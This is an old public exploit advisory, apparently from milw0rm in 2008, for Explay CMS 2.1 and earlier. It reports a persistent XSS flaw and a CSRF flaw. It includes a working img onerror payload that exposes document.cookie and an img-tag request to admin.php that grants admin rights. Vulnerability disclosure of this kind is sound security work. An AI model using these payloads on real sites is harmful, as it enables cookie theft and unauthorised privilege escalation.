<html><head><title>Explay CMS <= 2.1 Persistent XSS and CSRF Vulnerability</title></head><pre>==================================
Explay CMS &lt;= 2.1 Persistent XSS and CSRF
==================================
Discovered by hodik
Mail: n.khodov@gmail.com

1. Persistent XSS
This CMS has bad anti-XSS filter that cut only some basic vectors. The loginned user can inject persistent XSS by adding to article text or comment  &lt;img src=&quot;http://google.com&quot; onerror=&quot;alert(document.cookie)&quot; /&gt;

2. CSRF
User can get admin rights if admin open malicious page that contain, for instance:
&lt;img src=&quot;http://explay.localhost/admin.php?name=users&amp;page=1&amp;order=user_id&amp;set_admin=2&quot; /&gt;
or merely insert it to comment or article text.

# milw0rm.com [2008-09-19]</pre></html>